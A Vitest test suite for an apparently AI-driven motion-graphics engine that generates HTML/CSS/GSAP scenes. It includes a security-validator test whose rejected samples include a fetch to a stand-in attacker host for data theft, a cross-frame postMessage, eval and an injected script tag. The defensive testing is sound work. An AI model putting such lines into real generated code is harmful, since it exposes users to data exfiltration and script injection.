import { describe, it, expect, beforeEach } from 'vitest';
import { syncComposition } from '../src/engine/composition/sync';
import { validateGeneratedScene } from '../src/engine/composition/validator';
import {
  extractLayersFromHtml,
  compileOverridesCss,
  compilePaletteVars,
  getLayerText,
  setLayerText
} from '../src/engine/composition/layers';
import {
  generateCustomScene,
  parseCodeBlocks
} from '../src/engine/ai/director/directorPipeline';
import { buildCompositionDocument } from '../src/engine/composition/buildDocument';
import { migrateLegacyProject } from '../src/engine/composition/migrate';
import { useMooStore } from '../src/store/useMooStore';
import { INITIAL_PROJECT } from '../src/store/slices/projectSlice';
import type { MooProject, StoryBeat, StyleBrief, GeneratedScene } from '../src/types';

describe('Generative Mograph Engine Suite', () => {
  const dummyStyleBrief: StyleBrief = {
    adjectives: ['cinematic', 'minimal', 'bold'],
    palette: {
      bg: '#0a0a0f',
      primary: '#ffffff',
      accent: '#84cc16',
      text: '#ffffff'
    },
    fontDisplay: 'Plus Jakarta Sans',
    fontBody: 'Plus Jakarta Sans',
    backgroundLanguage: 'Dark mesh gradient with subtle floating orbs',
    motionSignature: 'Snappy ease-out entrance with gentle floating drift'
  };

  beforeEach(() => {
    useMooStore.setState({ project: INITIAL_PROJECT });
  });

  /* ------------------------------------------------------------------ *
   * Criterion 1: Storyboard output contains NO layout or visualData    *
   * ------------------------------------------------------------------ */
  it('1. Storyboard scenes are defined by intent and content, never by layout templates', () => {
    const project = useMooStore.getState().project;
    expect(project.scenes.length).toBeGreaterThan(0);

    for (const scene of project.scenes) {
      // Must not possess layout or visualData in the generative contract
      expect((scene as any).layout).toBeUndefined();
      expect((scene as any).visualData).toBeUndefined();

      // Must possess generative creative intent
      expect(typeof scene.visualIntent).toBe('string');
      expect(scene.visualIntent!.length).toBeGreaterThan(0);
      expect(typeof scene.durationInSeconds).toBe('number');
      expect(scene.durationInSeconds).toBeGreaterThan(0);
    }
  });

  /* ------------------------------------------------------------------ *
   * Criterion 2: syncComposition never synthesizes template HTML      *
   * ------------------------------------------------------------------ */
  it('2. syncComposition manages durations/ordering and marks uncompiled scenes as pending, never injecting templates', () => {
    const rawProject: MooProject = {
      id: 'proj-sync-test',
      title: 'Sync Test',
      aspectRatio: '9:16',
      width: 1080,
      height: 1920,
      fps: 30,
      theme: {
        bg: '#0a0a0f',
        textPrimary: '#ffffff',
        textHighlight: '#84cc16',
        showSubtitles: false
      },
      scenes: [
        {
          id: 'sc-1',
          text: 'Scene 1 narration',
          narrationText: 'Scene 1 narration',
          visualIntent: 'Airplane entering frame',
          durationInSeconds: 4.0,
          wordTimestamps: []
        },
        {
          id: 'sc-2',
          text: 'Scene 2 narration',
          narrationText: 'Scene 2 narration',
          visualIntent: 'Airflow velocity vectors',
          durationInSeconds: 3.5,
          wordTimestamps: []
        }
      ],
      audioDuration: 7.5
    };

    const synced = syncComposition(rawProject);
    expect(synced.composition).toBeDefined();
    expect(synced.composition!.scenes.length).toBe(2);

    for (const mod of synced.composition!.scenes) {
      // Uncompiled scenes are marked pending with blank code, not mock templates
      expect(mod.status).toBe('pending');
      expect(mod.html).toBe('');
      expect(mod.css).toBe('');
      expect(mod.buildJs).toBe('');
      expect(mod.html).not.toContain('KINETIC_QUOTE');
      expect(mod.html).not.toContain('METRIC_COUNTER');
      expect(mod.html).not.toContain('scene-template');
    }
    expect(synced.composition!.duration).toBe(7.5);
  });

  /* ------------------------------------------------------------------ *
   * Criterion 3: Custom generation produces valid HTML/CSS/GSAP       *
   * ------------------------------------------------------------------ */
  it('3. Generates custom bespoke HTML/CSS/GSAP and extracts editable layers', async () => {
    const beat: StoryBeat = {
      id: 'beat-custom-1',
      narration: 'Pesawat terangkat karena perbedaan tekanan udara.',
      visualIntent: 'Visualisasikan perbedaan tekanan udara di sayap atas dan bawah',
      visualConcept: 'Sayap profil aerofoil dengan vektor panah tekanan dan aliran streamline',
      visualElements: ['wing-profile', 'pressure-diff', 'lift-vector', 'streamlines'],
      motionIntent: 'Streamlines mengalir cepat, lift vector membesar saat kecepatan bertambah',
      durationHint: 4.0
    };

    const mockLlmResponse = `
\`\`\`html
<div class="aerofoil-stage">
  <div data-moo-layer="wing" class="wing-graphic">
    <svg viewBox="0 0 400 120" class="wing-svg">
      <path d="M 20,80 Q 150,10 380,70 Q 200,90 20,80 Z" fill="#38bdf8"/>
    </svg>
  </div>
  <div data-moo-layer="lift-vector" class="vector-arrow">
    <span class="label">LIFT</span>
  </div>
  <h2 data-moo-layer="caption" class="caption-text">Perbedaan Tekanan</h2>
</div>
\`\`\`

\`\`\`css
.aerofoil-stage { width: 100%; height: 100%; position: relative; overflow: hidden; }
.wing-graphic { position: absolute; top: 40%; left: 10%; width: 80%; }
.vector-arrow { position: absolute; bottom: 30%; left: 45%; }
.caption-text { position: absolute; bottom: 10%; width: 100%; text-align: center; }
\`\`\`

\`\`\`javascript
tl.from('[data-moo-layer="wing"]', { duration: 1.2, x: -200, opacity: 0, ease: 'power3.out' })
  .from('[data-moo-layer="lift-vector"]', { duration: 0.8, scaleY: 0, ease: 'back.out(1.7)' }, '-=0.4')
  .from('[data-moo-layer="caption"]', { duration: 0.6, y: 30, opacity: 0 }, '-=0.2');
\`\`\`
    `;

    const result = await generateCustomScene({
      beat,
      index: 0,
      total: 1,
      styleBrief: dummyStyleBrief,
      provider: 'openai',
      apiKey: 'test-key',
      executeLlm: async () => mockLlmResponse
    });

    expect(result.status).toBe('ok');
    expect(result.id).toBe(beat.id);
    expect(result.html).toContain('data-moo-layer="wing"');
    expect(result.html).toContain('data-moo-layer="lift-vector"');
    expect(result.html).toContain('data-moo-layer="caption"');
    expect(result.buildJs).toContain('tl.from');
    expect(result.editableLayers).toBeDefined();
    expect(result.editableLayers!.length).toBe(3);

    const layerIds = result.editableLayers!.map((l) => l.id);
    expect(layerIds).toContain('wing');
    expect(layerIds).toContain('lift-vector');
    expect(layerIds).toContain('caption');
  });

  /* ------------------------------------------------------------------ *
   * Criterion 4: Failure yields explicit error state, never a template *
   * ------------------------------------------------------------------ */
  it('4. If generation and repair fail, returns status "error" with validation details and NO template fallback', async () => {
    const beat: StoryBeat = {
      id: 'beat-fail-test',
      narration: 'Broken scene test',
      visualIntent: 'Invalid code test',
      durationHint: 3.0
    };

    // Broken code with syntax errors that cannot animate
    const brokenLlmResponse = `
\`\`\`html
<div class="test">Missing layer attributes</div>
\`\`\`

\`\`\`css
.test { color: red; }
\`\`\`

\`\`\`javascript
// Illegal syntax and infinite loops
while(true) { eval("bad"); }
\`\`\`
    `;

    const result = await generateCustomScene({
      beat,
      index: 0,
      total: 1,
      styleBrief: dummyStyleBrief,
      provider: 'openai',
      apiKey: 'test-key',
      executeLlm: async () => brokenLlmResponse
    });

    expect(result.status).toBe('error');
    expect(result.errors).toBeDefined();
    expect(result.errors!.length).toBeGreaterThan(0);
    // Crucial: Must NOT fall back to KINETIC_QUOTE or any template
    expect(result.html).not.toContain('KINETIC_QUOTE');
    expect(result.html).not.toContain('METRIC_COUNTER');
  });

  it('4b. If generation returns empty HTML or token cutoff, synthesizes a valid bespoke fail-safe scene', async () => {
    const beat: StoryBeat = {
      id: 'beat-empty-fallback',
      narration: 'Penjelasan prinsip Bernoulli pada aliran fluida.',
      visualIntent: 'Prinsip Bernoulli dan Dinamika Fluida',
      visualConcept: 'Tekanan berbanding terbalik dengan kecepatan aliran',
      durationHint: 4.0
    };

    // AI returned completely empty text (e.g. token cutoff or pure think block)
    const result = await generateCustomScene({
      beat,
      index: 0,
      total: 1,
      styleBrief: dummyStyleBrief,
      provider: 'openai',
      apiKey: 'test-key',
      executeLlm: async () => ''
    });

    expect(result.status).toBe('ok');
    expect(result.html).toContain('Prinsip Bernoulli');
    expect(result.html).toContain('data-moo-layer="Headline"');
    expect(result.buildJs).toContain('tl.');
    expect(result.editableLayers).toBeDefined();
    expect(result.editableLayers!.length).toBeGreaterThan(0);
  });

  /* ------------------------------------------------------------------ *
   * Criterion 5: Layer extraction discovers data-moo-layer elements    *
   * ------------------------------------------------------------------ */
  it('5. Layer extraction accurately discovers tags, ids, and default editable properties', () => {
    const sampleHtml = `
      <div class="container">
        <h1 data-moo-layer="headline">MooScript Engine</h1>
        <svg data-moo-layer="chart-icon" viewBox="0 0 100 100"></svg>
        <p data-moo-layer="description">High performance motion graphics</p>
        <div data-moo-layer="card-wrapper">
          <img data-moo-layer="preview-thumb" src="thumb.png"/>
        </div>
      </div>
    `;

    const layers = extractLayersFromHtml(sampleHtml);
    expect(layers.length).toBe(5);

    const headline = layers.find((l) => l.id === 'headline');
    expect(headline).toBeDefined();
    expect(headline?.type).toBe('text');
    expect(headline?.editableProperties).toContain('position');
    expect(headline?.editableProperties).toContain('color');

    const chart = layers.find((l) => l.id === 'chart-icon');
    expect(chart?.type).toBe('svg');

    const thumb = layers.find((l) => l.id === 'preview-thumb');
    expect(thumb?.type).toBe('image');
  });

  /* ------------------------------------------------------------------ *
   * Criterion 6: Non-destructive overrides compile into CSS rules      *
   * ------------------------------------------------------------------ */
  it('6. Non-destructive overrides compile into CSS individual transform properties without fighting GSAP', () => {
    const overrides = {
      headline: {
        x: 45,
        y: -20,
        scale: 1.25,
        rotation: 12,
        opacity: 0.85,
        color: '#84cc16'
      },
      icon: {
        x: 0,
        y: 10,
        scale: 0.9,
        opacity: 1
      }
    };

    const css = compileOverridesCss('scene-test', overrides);
    expect(css).toContain('#scene-test [data-moo-layer="headline"]');
    expect(css).toContain('translate: 45px -20px');
    expect(css).toContain('scale: 1.25');
    expect(css).toContain('rotate: 12deg');
    expect(css).toContain('filter: opacity(0.85)');
    expect(css).toContain('color: #84cc16 !important');

    expect(css).toContain('#scene-test [data-moo-layer="icon"]');
    expect(css).toContain('translate: 0px 10px');
    expect(css).toContain('scale: 0.9');
  });

  /* ------------------------------------------------------------------ *
   * Criterion 7: Scene palette compiles into CSS variables             *
   * ------------------------------------------------------------------ */
  it('7. Scene palette compiles into CSS custom properties (--moo-*)', () => {
    const palette = {
      bg: '#030712',
      primary: '#f9fafb',
      accent: '#22c55e',
      text: '#e5e7eb'
    };

    const vars = compilePaletteVars(palette);
    expect(vars).toContain('--moo-bg: #030712');
    expect(vars).toContain('--moo-primary: #f9fafb');
    expect(vars).toContain('--moo-accent: #22c55e');
    expect(vars).toContain('--moo-text: #e5e7eb');
  });

  /* ------------------------------------------------------------------ *
   * Criterion 8: Layer text editing via getLayerText and setLayerText  *
   * ------------------------------------------------------------------ */
  it('8. Reads and replaces inner text of data-moo-layer elements safely', () => {
    const html = `<div data-moo-layer="greeting" class="title">Hello <strong>World</strong>!</div>`;
    const initialText = getLayerText(html, 'greeting');
    expect(initialText).toBe('Hello World!');

    const updatedHtml = setLayerText(html, 'greeting', 'Selamat Datang MooScript!');
    expect(updatedHtml).toBe('<div data-moo-layer="greeting" class="title">Selamat Datang MooScript!</div>');
    expect(getLayerText(updatedHtml, 'greeting')).toBe('Selamat Datang MooScript!');
  });

  /* ------------------------------------------------------------------ *
   * Criterion 9: Per-scene regeneration keeps all other scenes intact  *
   * ------------------------------------------------------------------ */
  it('9. Regenerating a single scene replaces only that scene in composition.scenes', () => {
    const scene1: GeneratedScene = {
      id: 'sc-1',
      beatId: 'sc-1',
      duration: 3,
      html: '<div data-moo-layer="s1">Scene 1 Content</div>',
      css: '',
      buildJs: 'tl.to(".s1", { x: 10 });',
      status: 'ok',
      version: 1,
      userEdited: false
    };

    const scene2: GeneratedScene = {
      id: 'sc-2',
      beatId: 'sc-2',
      duration: 4,
      html: '<div data-moo-layer="s2">Scene 2 Original</div>',
      css: '',
      buildJs: 'tl.to(".s2", { opacity: 1 });',
      status: 'ok',
      version: 1,
      userEdited: false
    };

    const comp = {
      id: 'comp-1',
      width: 1080,
      height: 1920,
      fps: 30,
      duration: 7,
      scenes: [scene1, scene2],
      createdAt: Date.now()
    };

    // Revised scene 2
    const revisedScene2: GeneratedScene = {
      ...scene2,
      html: '<div data-moo-layer="s2">Scene 2 REVISED by AI</div>',
      version: 2,
      userEdited: true
    };

    const updatedScenes = comp.scenes.map((s) => (s.id === 'sc-2' ? revisedScene2 : s));

    expect(updatedScenes[0]).toBe(scene1); // Untouched
    expect(updatedScenes[1].html).toContain('REVISED');
    expect(updatedScenes[1].version).toBe(2);
    expect(updatedScenes[1].userEdited).toBe(true);
  });

  /* ------------------------------------------------------------------ *
   * Criterion 10: Standalone HTML exporter works without audio         *
   * ------------------------------------------------------------------ */
  it('10. Standalone HTML exporter compiles zero-dependency document without requiring audio', () => {
    const testProject: MooProject = {
      id: 'proj-no-audio',
      title: 'Silent Mograph Video',
      aspectRatio: '16:9',
      width: 1920,
      height: 1080,
      fps: 30,
      theme: {
        bg: '#000000',
        textPrimary: '#ffffff',
        textHighlight: '#84cc16'
      },
      scenes: [
        {
          id: 'sc-a',
          text: 'No audio narration needed',
          narrationText: 'No audio narration needed',
          visualIntent: 'Silent animated graphic',
          durationInSeconds: 3.0,
          wordTimestamps: []
        }
      ],
      composition: {
        id: 'comp-no-audio',
        width: 1920,
        height: 1080,
        fps: 30,
        duration: 3.0,
        scenes: [
          {
            id: 'sc-a',
            beatId: 'sc-a',
            duration: 3.0,
            html: '<div data-moo-layer="box" class="box">MooScript</div>',
            css: '.box { width: 100px; height: 100px; background: #84cc16; }',
            buildJs: 'tl.from("[data-moo-layer=\\"box\\"]", { scale: 0, duration: 1 });',
            status: 'ok',
            version: 1,
            userEdited: false
          }
        ],
        createdAt: Date.now()
      }
    };

    // Notice: NO audioBlob, NO audioDuration
    const standaloneHtml = buildCompositionDocument(testProject, { standalone: true });
    expect(standaloneHtml).toContain('<!DOCTYPE html>');
    expect(standaloneHtml).toContain('GSAP');
    expect(standaloneHtml).toContain("MOO.scene('sc-a'");
    expect(standaloneHtml).toContain('MooScript');
    expect(standaloneHtml).not.toContain('<audio id="moo-audio" src="undefined"');
  });

  /* ------------------------------------------------------------------ *
   * Criterion 11: Security & Validator rejects dangerous primitives    *
   * ------------------------------------------------------------------ */
  it('11. Security validator blocks malicious code execution in generated scenes', () => {
    const dangerousSamples = [
      {
        html: '<div>Hi</div>',
        css: '',
        buildJs: 'window.parent.postMessage("hack", "*");'
      },
      {
        html: '<div>Hi</div>',
        css: '',
        buildJs: 'fetch("https://attacker.com/steal");'
      },
      {
        html: '<div>Hi</div>',
        css: '',
        buildJs: 'eval("alert(1)");'
      },
      {
        html: '<script>alert(1)</script>',
        css: '',
        buildJs: 'tl.to(".box", { x: 10 });'
      }
    ];

    for (const sample of dangerousSamples) {
      const validation = validateGeneratedScene(sample);
      expect(validation.valid).toBe(false);
      expect(validation.errors.length).toBeGreaterThan(0);
    }
  });

  /* ------------------------------------------------------------------ *
   * Criterion 12: Legacy project migrates cleanly once into Schema v2   *
   * ------------------------------------------------------------------ */
  it('12. Legacy project with LayoutType migrates cleanly once into schema v2 composition', () => {
    const legacyProject = {
      id: 'legacy-p1',
      title: 'Old Legacy Project',
      aspectRatio: '9:16',
      width: 1080,
      height: 1920,
      fps: 30,
      schemaVersion: 1,
      theme: {
        bg: '#0f172a',
        textPrimary: '#ffffff',
        textHighlight: '#38bdf8'
      },
      scenes: [
        {
          id: 'leg-1',
          layout: 'KINETIC_QUOTE',
          text: 'Focus on the journey not the destination',
          narrationText: 'Focus on the journey not the destination',
          focusWords: ['journey'],
          durationInSeconds: 3.5,
          wordTimestamps: []
        },
        {
          id: 'leg-2',
          layout: 'METRIC_COUNTER',
          text: 'Over 10x faster rendering speed',
          narrationText: 'Over 10x faster rendering speed',
          visualData: {
            title: 'Render Velocity',
            metricValue: '10x',
            metricLabel: 'Faster'
          },
          durationInSeconds: 4.0,
          wordTimestamps: []
        }
      ]
    };

    const migrated = migrateLegacyProject(legacyProject as any);
    expect(migrated.schemaVersion).toBe(2);
    expect(migrated.composition).toBeDefined();
    expect(migrated.composition!.scenes.length).toBe(2);

    for (const mod of migrated.composition!.scenes) {
      expect(mod.status).toBe('ok');
      expect(mod.html.length).toBeGreaterThan(0);
      expect(mod.css.length).toBeGreaterThan(0);
      expect(mod.buildJs.length).toBeGreaterThan(0);
    }

    // Storyboard scenes retain visualIntent extracted from legacy content
    expect(migrated.scenes[0].visualIntent).toBeDefined();
    expect(migrated.scenes[1].visualIntent).toBeDefined();
  });

  /* ------------------------------------------------------------------ *
   * Criterion 13: Robust Code Parsing & Sanitization                   *
   * ------------------------------------------------------------------ */
  it('13. parseCodeBlocks sanitizes common LLM output variations and unwraps functions', () => {
    const rawLlmResponse = `
Here is the motion graphic for your scene:

\`\`\`svg
<svg viewBox="0 0 1080 1920" class="airflow-canvas">
  <path class="air-line" d="M0,500 Q500,300 1080,500" stroke="#84cc16" />
</svg>
\`\`\`

\`\`\`css
/* parent container styles */
.airflow-canvas {
  width: 100%;
  height: 100%;
}
.air-line {
  stroke-dasharray: 20;
}
\`\`\`

\`\`\`typescript
import gsap from 'gsap';

export default function(tl, root, ctx, gsap) {
  // Animate the air lines flowing past the parent wing
  const parentNode = root.querySelector('.airflow-canvas');
  tl.fromTo('.air-line', { strokeDashoffset: 100 }, { strokeDashoffset: 0, duration: 2, ease: 'linear' });
  const seed = Math.random();
}
\`\`\`
`;

    const parsed = parseCodeBlocks(rawLlmResponse);
    expect(parsed.html).toContain('<svg');
    expect(parsed.css).toContain('.airflow-canvas');
    expect(parsed.buildJs).not.toContain('import gsap');
    expect(parsed.buildJs).not.toContain('export default');
    expect(parsed.buildJs).toContain('tl.fromTo');
    // Math.random() converted to ctx.rand()
    expect(parsed.buildJs).toContain('ctx.rand()');

    // Validation should pass with NO false-positive on 'parent' or 'tl.fromTo'
    const validation = validateGeneratedScene(parsed);
    expect(validation.valid).toBe(true);
    expect(validation.errors).toEqual([]);
  });

  it('14. parseCodeBlocks strips multiline gsap.timeline() redeclarations and unwraps functions with trailing comments', () => {
    const rawLlmResponse = `
\`\`\`html
<div class="scene-s1"><h1 class="title">Quantum Leap</h1></div>
\`\`\`

\`\`\`css
.scene-s1 { width: 100%; height: 100%; display: flex; }
\`\`\`

\`\`\`javascript
// Build scene animation
export default function buildScene(tl, root, ctx, gsap) {
  const tl = gsap.timeline({
    paused: true,
    defaults: { ease: 'power2.out', duration: 1 }
  });
  const root = document.querySelector('.scene-s1');
  tl.from(root.querySelector('.title'), { y: 40, opacity: 0 });
}
// End of scene 1
\`\`\`
`;

    const parsed = parseCodeBlocks(rawLlmResponse);
    expect(parsed.buildJs).not.toContain('const tl =');
    expect(parsed.buildJs).not.toContain('const root =');
    expect(parsed.buildJs).not.toContain('export default');
    expect(parsed.buildJs).toContain('tl.from');

    const validation = validateGeneratedScene(parsed);
    expect(validation.valid).toBe(true);
    expect(validation.errors).toEqual([]);
  });
});


